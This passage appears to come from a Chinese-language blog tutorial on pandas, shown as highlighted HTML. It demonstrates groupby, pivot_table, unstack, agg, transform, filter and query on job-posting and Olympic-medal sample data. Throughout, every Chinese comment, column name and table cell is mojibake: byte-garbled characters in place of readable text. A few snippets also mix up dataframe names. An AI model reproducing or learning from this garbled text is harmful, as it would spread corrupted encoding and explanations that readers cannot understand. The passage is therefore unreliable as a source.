åˆ—ï¼Œå€¼ä¸ºè¯¥å›½ é‡‘ã€é“¶ã€é“œ ç‰Œæ•°é‡ä¸­æœ€å¤šçš„ä¸€ä¸ªå¥–ç‰Œæ•°é‡</span></span><br><span class="line">df[<span class="string">&#x27;æœ€å¤šå¥–ç‰Œæ•°é‡&#x27;</span>] = df.bfill(<span class="number">1</span>)[[<span class="string">&quot;é‡‘ç‰Œæ•°&quot;</span>, <span class="string">&quot;é“¶ç‰Œæ•°&quot;</span>,<span class="string">&#x27;é“œç‰Œæ•°&#x27;</span>]].<span class="built_in">max</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>- </p><h3><span id="retrieve">Retrieve</span></h3><ul><li>éšæœºè¿”å›nä¸ªæ ·æœ¬</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.sample(n)</span><br></pre></td></tr></table></figure><ul><li>pivotä¸groupby</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pd.pivot_table(df2,values = [<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>],index = [<span class="string">&#x27;å›½å®¶&#x27;</span>,<span class="string">&#x27;è¿åŠ¨ç±»åˆ«&#x27;</span>],aggfunc = <span class="string">&#x27;count&#x27;</span>)</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">pd.DataFrame(df2.groupby([<span class="string">&#x27;å›½å®¶&#x27;</span>,<span class="string">&#x27;è¿åŠ¨ç±»åˆ«&#x27;</span>]).count()[<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>])</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">df2.groupby([<span class="string">&#x27;å›½å®¶&#x27;</span>,<span class="string">&#x27;è¿åŠ¨ç±»åˆ«&#x27;</span>]).count()[[<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># groupby è”åˆ apply</span></span><br><span class="line">q2[<span class="string">&#x27;æ‹çˆ±çš„ç”·ç”Ÿæ¯”ä¾‹&#x27;</span>] = df[df[<span class="string">&#x27;romantic&#x27;</span>]==<span class="string">&#x27;yes&#x27;</span>].groupby(<span class="string">&#x27;age&#x27;</span>).apply(<span class="keyword">lambda</span> x:x.sex==<span class="string">&#x27;M&#x27;</span>).groupby(<span class="string">&#x27;age&#x27;</span>).<span class="built_in">sum</span>()/q2_rom.groupby(<span class="string">&#x27;age&#x27;</span>).count()[<span class="string">&#x27;sex&#x27;</span>]</span><br><span class="line"><span class="comment"># ç›¸å½“äºåœ¨[]é‡Œé¢å†™æ¡ä»¶</span></span><br><span class="line">df[df[<span class="string">&#x27;smoker&#x27;</span>]==<span class="string">&#x27;yes&#x27;</span>].groupby(<span class="string">&#x27;ageåŒºé—´&#x27;</span>).count()</span><br><span class="line"><span class="comment"># countå’Œsumæœ‰åŒºåˆ«ï¼Œä¸€ä¸ªæ˜¯è®¡ç®—boolåæ±‚å’Œï¼Œä¸€ä¸ªåœ¨æ¡ä»¶ç­›é€‰åæ±‚ä¸ªæ•°</span></span><br><span class="line">df.groupby(<span class="string">&#x27;ageåŒºé—´&#x27;</span>).apply(<span class="keyword">lambda</span> x:x.smoker==<span class="string">&#x27;yes&#x27;</span>).groupby(<span class="string">&#x27;ageåŒºé—´&#x27;</span>).<span class="built_in">sum</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŠŠgroupbyçš„å…ƒç´ å–å‡ºæ¥</span></span><br><span class="line">pieces = <span class="built_in">dict</span>(<span class="built_in">list</span>(df.groupby(<span class="string">&#x27;key1&#x27;</span>)))</span><br><span class="line">pieces[<span class="string">&#x27;b&#x27;</span>]</span><br><span class="line"><span class="comment"># groupby ä½¿ç”¨å­—å…¸</span></span><br><span class="line">by_column = people.groupby(mapping, axis=<span class="number">1</span>)</span><br><span class="line">by_column.<span class="built_in">sum</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>unstack</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è®¡ç®—å‰ååå„å›½æ¯æ—¥å¥–ç‰Œæ•°é‡åˆè®¡</span></span><br><span class="line"><span class="comment"># æ³¨æ„ï¼šå¯¹äºç¬¬ä¸€å¤©æ²¡æœ‰æ•°æ®çš„å›½å®¶ç”¨0å¡«å……ï¼Œå…¶ä½™æ—¶é—´çš„ç¼ºå¤±å€¼ç”¨ä¸Šä¸€æ—¥æ•°æ®å¡«å……</span></span><br><span class="line">countries = df2.groupby(<span class="string">&#x27;å›½å®¶&#x27;</span>).count().sort_values(<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>,ascending=<span class="literal">False</span>).head(<span class="number">10</span>).index.tolist()</span><br><span class="line">tmp = df2[df2[<span class="string">&#x27;å›½å®¶&#x27;</span>].isin(countries)]</span><br><span class="line">tmp.groupby([<span class="string">&#x27;è·å¥–æ—¶é—´&#x27;</span>,<span class="string">&#x27;å›½å®¶&#x27;</span>]).count()[<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>].unstack().cumsum().fillna(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># å¯¹äºä¸¤å±‚çš„Series </span></span><br><span class="line">data = pd.Series(np.random.randn(<span class="number">9</span>),</span><br><span class="line">                 index=[[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;d&#x27;</span>],</span><br><span class="line">                        [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>]])</span><br><span class="line"><span class="comment"># é€‰ç¬¬äºŒä¸ªç´¢å¼•å€¼çš„æ“ä½œï¼š</span></span><br><span class="line">data[:,<span class="number">2</span>]</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">data.unstack().iloc[:,<span class="number">1</span>]</span><br></pre></td></tr></table></figure><ul><li>æ•°æ®èšåˆ</li></ul><table><thead><tr><th align="right">positionName</th><th align="right">companySize</th><th align="right">industryField</th><th align="right">financeStage</th><th align="right">companyLabelList</th><th align="right">firstType</th><th align="right">secondType</th><th align="right">thirdType</th><th align="right">createTime</th><th align="right">district</th><th align="right">salary</th><th align="right">workYear</th><th align="right">jobNature</th><th align="right">education</th><th align="right">positionAdvantage</th><th align="right">imState</th><th align="right">score</th><th align="right">matchScore</th><th align="right">famousCompany</th><th align="right">Hobby</th><th></th></tr></thead><tbody><tr><td align="right">0</td><td align="right">æ•°æ®åˆ†æ</td><td align="right">50-150äºº</td><td align="right">ç§»åŠ¨äº’è”ç½‘,ç”µå•†</td><td align="right">Aè½®</td><td align="right">[â€˜ç»©æ•ˆå¥–é‡‘â€™, â€˜å¸¦è–ªå¹´å‡â€™, â€˜å®šæœŸä½“æ£€â€™, â€˜å¼¹æ€§å·¥ä½œâ€™]</td><td align="right">äº§å“|éœ€æ±‚|é¡¹ç›®ç±»</td><td align="right">æ•°æ®åˆ†æ</td><td align="right">æ•°æ®åˆ†æ</td><td align="right">2020&#x2F;3&#x2F;16 11:00</td><td align="right">ä½™æ­åŒº</td><td align="right">37500</td><td align="right">1-3å¹´</td><td align="right">å…¨èŒ</td><td align="right">æœ¬ç§‘</td><td align="right">äº”é™©ä¸€é‡‘ã€å¼¹æ€§å·¥ä½œã€å¸¦è–ªå¹´å‡ã€å¹´åº¦ä½“æ£€</td><td align="right">today</td><td align="right">233</td><td align="right">15.101875</td><td align="right">False</td><td>â€˜ç»©æ•ˆå¥–é‡‘â€™</td></tr><tr><td align="right">0</td><td align="right">æ•°æ®åˆ†æ</td><td align="right">50-150äºº</td><td align="right">ç§»åŠ¨äº’è”ç½‘,ç”µå•†</td><td align="right">Aè½®</td><td align="right">[â€˜ç»©æ•ˆå¥–é‡‘â€™, â€˜å¸¦è–ªå¹´å‡â€™, â€˜å®šæœŸä½“æ£€â€™, â€˜å¼¹æ€§å·¥ä½œâ€™]</td><td align="right">äº§å“|éœ€æ±‚|é¡¹ç›®ç±»</td><td align="right">æ•°æ®åˆ†æ</td><td align="right">æ•°æ®åˆ†æ</td><td align="right">2020&#x2F;3&#x2F;16 11:00</td><td align="right">ä½™æ­åŒº</td><td align="right">37500</td><td align="right">1-3å¹´</td><td align="right">å…¨èŒ</td><td align="right">æœ¬ç§‘</td><td align="right">äº”é™©ä¸€é‡‘ã€å¼¹æ€§å·¥ä½œã€å¸¦è–ªå¹´å‡ã€å¹´åº¦ä½“æ£€</td><td align="right">today</td><td align="right">233</td><td align="right">15.101875</td><td align="right">False</td><td>â€˜å¸¦è–ªå¹´å‡â€™</td></tr><tr><td align="right">0</td><td align="right">æ•°æ®åˆ†æ</td><td align="right">50-150äºº</td><td align="right">ç§»åŠ¨äº’è”ç½‘,ç”µå•†</td><td align="right">Aè½®</td><td align="right">[â€˜ç»©æ•ˆå¥–é‡‘â€™, â€˜å¸¦è–ªå¹´å‡â€™, â€˜å®šæœŸä½“æ£€â€™, â€˜å¼¹æ€§å·¥ä½œâ€™]</td><td align="right">äº§å“|éœ€æ±‚|é¡¹ç›®ç±»</td><td align="right">æ•°æ®åˆ†æ</td><td align="right">æ•°æ®åˆ†æ</td><td align="right">2020&#x2F;3&#x2F;16 11:00</td><td align="right">ä½™æ­åŒº</td><td align="right">37500</td><td align="right">1-3å¹´</td><td align="right">å…¨èŒ</td><td align="right">æœ¬ç§‘</td><td align="right">äº”é™©ä¸€é‡‘ã€å¼¹æ€§å·¥ä½œã€å¸¦è–ªå¹´å‡ã€å¹´åº¦ä½“æ£€</td><td align="right">today</td><td align="right">233</td><td align="right">15.101875</td><td align="right">False</td><td>â€˜å®šæœŸä½“æ£€â€™</td></tr><tr><td align="right">0</td><td align="right">æ•°æ®åˆ†æ</td><td align="right">50-150äºº</td><td align="right">ç§»åŠ¨äº’è”ç½‘,ç”µå•†</td><td align="right">Aè½®</td><td align="right">[â€˜ç»©æ•ˆå¥–é‡‘â€™, â€˜å¸¦è–ªå¹´å‡â€™, â€˜å®šæœŸä½“æ£€â€™, â€˜å¼¹æ€§å·¥ä½œâ€™]</td><td align="right">äº§å“|éœ€æ±‚|é¡¹ç›®ç±»</td><td align="right">æ•°æ®åˆ†æ</td><td align="right">æ•°æ®åˆ†æ</td><td align="right">2020&#x2F;3&#x2F;16 11:00</td><td align="right">ä½™æ­åŒº</td><td align="right">37500</td><td align="right">1-3å¹´</td><td align="right">å…¨èŒ</td><td align="right">æœ¬ç§‘</td><td align="right">äº”é™©ä¸€é‡‘ã€å¼¹æ€§å·¥ä½œã€å¸¦è–ªå¹´å‡ã€å¹´åº¦ä½“æ£€</td><td align="right">today</td><td align="right">233</td><td align="right">15.101875</td><td align="right">False</td><td>â€˜å¼¹æ€§å·¥ä½œâ€™</td></tr><tr><td align="right">1</td><td align="right">æ•°æ®å»ºæ¨¡</td><td align="right">150-500äºº</td><td align="right">ç”µå•†</td><td align="right">Bè½®</td><td align="right">[â€˜å¹´ç»ˆå¥–é‡‘â€™, â€˜åšäº”ä¼‘äºŒâ€™, â€˜å…­é™©ä¸€é‡‘â€™, â€˜å­å¥³ç¦åˆ©â€™]</td><td align="right">å¼€å‘|æµ‹è¯•|è¿ç»´ç±»</td><td align="right">æ•°æ®å¼€å‘</td><td align="right">å»ºæ¨¡</td><td align="right">2020&#x2F;3&#x2F;16 11:08</td><td align="right">æ»¨æ±ŸåŒº</td><td align="right">15000</td><td align="right">3-5å¹´</td><td align="right">å…¨èŒ</td><td align="right">æœ¬ç§‘</td><td align="right">å…­é™©ä¸€é‡‘,å®šæœŸä½“æ£€,ä¸°åšå¹´ç»ˆ</td><td align="right">disabled</td><td align="right">176</td><td align="right">32.559414</td><td align="right">False</td><td>â€˜å¹´ç»ˆå¥–é‡‘â€™</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">åˆ†ç»„</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># åˆ†ç»„ï¼Œä½†ä¸ä½œä¸ºç´¢å¼•</span></span><br><span class="line">df.groupby(<span class="string">&quot;district&quot;</span>, as_index=<span class="literal">False</span>)[<span class="string">&#x27;salary&#x27;</span>].mean()</span><br><span class="line"><span class="comment"># åˆ†ç»„ pandas.core.series.Series æ ¼å¼</span></span><br><span class="line">df.groupby(<span class="string">&quot;district&quot;</span>)[<span class="string">&#x27;salary&#x27;</span>].mean()</span><br><span class="line">df[<span class="string">&#x27;salary&#x27;</span>].groupby(df[<span class="string">&#x27;district&#x27;</span>]).mean() </span><br><span class="line"><span class="comment"># åˆ†ç»„ pandas.core.frame.DataFrame æ ¼å¼</span></span><br><span class="line">df.groupby(<span class="string">&quot;district&quot;</span>)[<span class="string">&#x27;salary&#x27;</span>].mean().to_frame()</span><br><span class="line">df.groupby(<span class="string">&quot;district&quot;</span>)[[<span class="string">&#x27;salary&#x27;</span>]].mean()</span><br><span class="line">df[[<span class="string">&#x27;district&#x27;</span>,<span class="string">&#x27;salary&#x27;</span>]].groupby(<span class="string">&#x27;district&#x27;</span>).mean()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›¸åŒçš„ç»“æœ</span></span><br><span class="line">df[<span class="string">&#x27;salary&#x27;</span>].groupby([df[<span class="string">&#x27;workYear&#x27;</span>],</span><br><span class="line">                      df[<span class="string">&#x27;education&#x27;</span>]]).mean()</span><br><span class="line">df.groupby([<span class="string">&#x27;workYear&#x27;</span>, <span class="string">&#x27;education&#x27;</span>]).mean()[<span class="string">&#x27;salary&#x27;</span>]</span><br><span class="line">df.groupby([<span class="string">&#x27;workYear&#x27;</span>, <span class="string">&#x27;education&#x27;</span>])[<span class="string">&#x27;salary&#x27;</span>].mean()</span><br><span class="line">df.groupby([<span class="string">&#x27;workYear&#x27;</span>, <span class="string">&#x27;education&#x27;</span>])[<span class="string">&#x27;salary&#x27;</span>].agg(<span class="string">&#x27;mean&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># groupby ç”¨å­—å…¸</span></span><br><span class="line"><span class="comment">#å°† score å’Œ matchScore çš„å’Œè®°ä¸ºæ€»åˆ†ï¼Œä¸ salary åˆ—åŒæ—¶è¿›è¡Œåˆ†ç»„ï¼Œå¹¶æŸ¥çœ‹ç»“æœ</span></span><br><span class="line">df.groupby(&#123;<span class="string">&#x27;salary&#x27;</span>:<span class="string">&#x27;è–ªèµ„&#x27;</span>,<span class="string">&#x27;score&#x27;</span>:<span class="string">&#x27;æ€»åˆ†&#x27;</span>,<span class="string">&#x27;matchScore&#x27;</span>:<span class="string">&#x27;æ€»åˆ†&#x27;</span>&#125;, axis=<span class="number">1</span>).<span class="built_in">sum</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ†ç»„è®¡ç®—ä¸åŒè¡Œæ”¿åŒºï¼Œè–ªæ°´çš„æœ€å°å€¼ã€æœ€å¤§å€¼å’Œå¹³å‡å€¼</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>)[<span class="string">&#x27;salary&#x27;</span>].agg([<span class="built_in">min</span>, <span class="built_in">max</span>, np.mean])</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¹ä¸åŒè¡Œæ”¿åŒºè¿›è¡Œåˆ†ç»„ï¼Œå¹¶ç»Ÿè®¡è–ªæ°´çš„å‡å€¼ã€ä¸­ä½æ•°ã€æ–¹å·®ï¼Œä»¥åŠå¾—åˆ†çš„å‡å€¼</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>).agg(</span><br><span class="line">    &#123;<span class="string">&#x27;salary&#x27;</span>: [np.mean, np.median, np.std], <span class="string">&#x27;score&#x27;</span>: np.mean&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¯¹ä¸åŒå²—ä½(positionName)è¿›è¡Œåˆ†ç»„ï¼Œå¹¶ç»Ÿè®¡å…¶è–ªæ°´(salary)ä¸­ä½æ•°å’Œå¾—åˆ†(score)å‡å€¼</span></span><br><span class="line">df.groupby(<span class="string">&#x27;positionName&#x27;</span>).agg(&#123;<span class="string">&#x27;salary&#x27;</span>: np.median, <span class="string">&#x27;score&#x27;</span>: np.mean&#125;)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ç»Ÿè®¡æ¯ä¸ªåŒºä¸åŒå¤§å°å…¬å¸ä¸ªæ•°</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># æ–¹å¼1ï¼šgroupby</span></span><br><span class="line">df.groupby([<span class="string">&#x27;district&#x27;</span>,<span class="string">&#x27;companySize&#x27;</span>])[<span class="string">&#x27;companySize&#x27;</span>].count()</span><br><span class="line"><span class="comment"># æ–¹å¼2ï¼švalue_counts() æ’åºæŒ‰ç…§ä¸ªæ•°é™åº</span></span><br><span class="line">df.groupby(<span class="string">&quot;district&quot;</span>)[<span class="string">&#x27;companySize&#x27;</span>].value_counts()</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹groupçš„ç»“æœ</span></span><br><span class="line">df.groupby([<span class="string">&quot;district&quot;</span>,<span class="string">&#x27;salary&#x27;</span>]).groups</span><br><span class="line"><span class="comment"># å°†æ•°æ®æŒ‰ç…§ districtã€salary è¿›è¡Œåˆ†ç»„ï¼Œå¹¶æŸ¥çœ‹è¥¿æ¹–åŒºè–ªèµ„ä¸º 30000 çš„å·¥ä½œ</span></span><br><span class="line">df.groupby([<span class="string">&quot;district&quot;</span>,<span class="string">&#x27;salary&#x27;</span>]).get_group((<span class="string">&quot;è¥¿æ¹–åŒº&quot;</span>,<span class="number">30000</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">æˆ‘ä»¬å°†ä¼šç”¨åˆ° transform è€Œä¸æ˜¯ applyæˆ–è€…meanã€‚ åŸå› æ˜¯ï¼Œ transform å°†ä¼šä¿æŒ dataframe çŸ©é˜µçš„å½¢çŠ¶(shape)(å°±æ˜¯è¡Œåˆ—æ•°ä¸å˜)è€Œ apply ä¼šæ”¹å˜çŸ©é˜µçš„å½¢çŠ¶ã€‚</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># åœ¨åŸæ•°æ®æ¡† df æ–°å¢ä¸€åˆ—ï¼Œæ•°å€¼ä¸ºè¯¥åŒºçš„å¹³å‡è–ªèµ„æ°´å¹³</span></span><br><span class="line">df[<span class="string">&#x27;è¯¥åŒºå¹³å‡å·¥èµ„&#x27;</span>] = df[[<span class="string">&#x27;district&#x27;</span>,<span class="string">&#x27;salary&#x27;</span>]].groupby(by=<span class="string">&#x27;district&#x27;</span>).transform(<span class="string">&#x27;mean&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—å„è¡Œæ”¿åŒºçš„ä¼ä¸šé¢†åŸŸï¼ˆindustryFieldï¼‰åŒ…å«ç”µå•†çš„æ€»æ•°</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>)[<span class="string">&quot;industryField&quot;</span>].apply(<span class="keyword">lambda</span> x: x.<span class="built_in">str</span>.contains(<span class="string">&#x27;ç”µå•†&#x27;</span>).<span class="built_in">sum</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment">#é€šè¿‡ positionName çš„é•¿åº¦è¿›è¡Œåˆ†ç»„ï¼Œå¹¶è®¡ç®—ä¸åŒé•¿åº¦å²—ä½åç§°çš„è–ªèµ„å‡å€¼</span></span><br><span class="line">df.set_index(<span class="string">&quot;positionName&quot;</span>).groupby(<span class="built_in">len</span>)[<span class="string">&#x27;salary&#x27;</span>].mean()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">where ç­‰åŒäºå†™åœ¨df[]ä¸­çš„æ¡ä»¶</span></span><br><span class="line"><span class="string">query å‡½æ•°æˆ‘ç±»ä¼¼sqlè¯­è¨€ä¸­çš„where ç›¸å½“äºåœ¨dfä¸­å†™sql</span></span><br><span class="line"><span class="string">filter ç±»ä¼¼sqlä¸­groupbyåçš„having</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># where</span></span><br><span class="line">work_index.where(work_index[<span class="string">&#x27;åœ°å¸‚&#x27;</span>]==<span class="string">&#x27;å¦é—¨å¸‚&#x27;</span>)</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">work_index.query(<span class="string">&#x27;åœ°å¸‚==&quot;å¦é—¨å¸‚&quot;&#x27;</span>)</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">work_index[work_index[<span class="string">&#x27;åœ°å¸‚&#x27;</span>]==<span class="string">&#x27;å¦é—¨å¸‚&#x27;</span>]</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">work_index.loc[work_index[<span class="string">&#x27;åœ°å¸‚&#x27;</span>]==<span class="string">&#x27;å¦é—¨å¸‚&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># æå–å¹³å‡å·¥èµ„å°äº 30000 çš„è¡Œæ”¿åŒºçš„å…¨éƒ¨æ•°æ®</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>).<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x[<span class="string">&#x27;salary&#x27;</span>].mean() &lt; <span class="number">30000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é€šè¿‡åŒ¿åå‡½æ•°åˆ†ç»„ æ ¹æ® createTime åˆ—ï¼Œè®¡ç®—æ¯å¤©ä¸åŒ è¡Œæ”¿åŒº æ–°å¢çš„å²—ä½æ•°é‡</span></span><br><span class="line">pd.DataFrame(df.groupby([df.createTime.apply(<span class="keyword">lambda</span> x:x.day)])[</span><br><span class="line">             <span class="string">&#x27;district&#x27;</span>].value_counts()).rename_axis([<span class="string">&quot;å‘å¸ƒæ—¥&quot;</span>, <span class="string">&quot;è¡Œæ”¿åŒº&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># é€šè¿‡ df2 è®¡ç®—è·å¾—å¥–ç‰Œæœ€å¤šçš„è¿åŠ¨å‘˜</span></span><br><span class="line">df2[<span class="string">&#x27;è¿åŠ¨å‘˜&#x27;</span>].value_counts().sort_values(ascending=<span class="literal">False</span>).head(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#ç­‰ä»·äº</span></span><br><span class="line">df.groupby(<span class="string">&#x27;è¿åŠ¨å‘˜&#x27;</span>).count()[<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>].sort_values(ascending=<span class="literal">False</span>).head(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹å„å›½åœ¨ä¸åŒé¡¹ç›®ä¸Šçš„è·å¥–ç‰Œæƒ…å†µ</span></span><br><span class="line"><span class="comment"># è¿™é‡Œæ‹¬å·å†…è¦å†™df[]</span></span><br><span class="line">df2[<span class="string">&#x27;æ€»å¥–ç‰Œæ•°&#x27;</span>].groupby([df2[<span class="string">&#x27;å›½å®¶&#x27;</span>],df2[<span class="string">&#x27;è¿åŠ¨ç±»åˆ«&#x27;</span>]]).count().to_frame()</span><br><span class="line"></span><br><span class="line">df2.groupby([<span class="string">&#x27;å›½å®¶&#x27;</span>,<span class="string">&#x27;è¿åŠ¨ç±»åˆ«&#x27;</span>]).count()[<span class="string">&#x27;æ€»å¥–ç‰Œæ•°&#x27;</span>].to_frame()</span><br><span class="line">pd.pivot_table(df2,values = [<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>],index = [<span class="string">&#x27;å›½å®¶&#x27;</span>,<span class="string">&#x27;è¿åŠ¨ç±»åˆ«&#x27;</span>],aggfunc = <span class="string">&#x27;count&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŒ‰ç…§åˆ—è®¡ç®—å¹³å‡å€¼</span></span><br><span class="line">df.mean(axis=<span class="string">&#x27;columns&#x27;</span>)</span><br><span class="line">df.mean(axis=<span class="number">1</span>) <span class="comment">#ä¸æ˜¯0ï¼Œ1æ˜¯ç®—æ¯åˆ—çš„å‡å€¼ç„¶åç„¶ååˆå¹¶ä¸ºä¸€è¡Œ</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è‡ªå®šä¹‰å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myfunc</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x.<span class="built_in">max</span>()-x.mean()</span><br><span class="line"></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>).agg(æœ€ä½å·¥èµ„=(<span class="string">&#x27;salary&#x27;</span>, <span class="string">&#x27;min&#x27;</span>), æœ€é«˜å·¥èµ„=(</span><br><span class="line">    <span class="string">&#x27;salary&#x27;</span>, <span class="string">&#x27;max&#x27;</span>), å¹³å‡å·¥èµ„=(<span class="string">&#x27;salary&#x27;</span>, <span class="string">&#x27;mean&#x27;</span>), æœ€å¤§å€¼ä¸å‡å€¼å·®å€¼=(<span class="string">&#x27;salary&#x27;</span>, myfunc)).rename_axis([<span class="string">&quot;è¡Œæ”¿åŒº&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®— æ€»åˆ†ã€é«˜ç«¯äººæ‰å¾—åˆ†ã€åŠå­¦å±‚æ¬¡å¾—åˆ†çš„æœ€å¤§æœ€å°å€¼ã€ä¸­ä½æ•°ã€å‡å€¼</span></span><br><span class="line">df.agg(&#123;</span><br><span class="line">        <span class="string">&quot;æ€»åˆ†&quot;</span>: [<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span 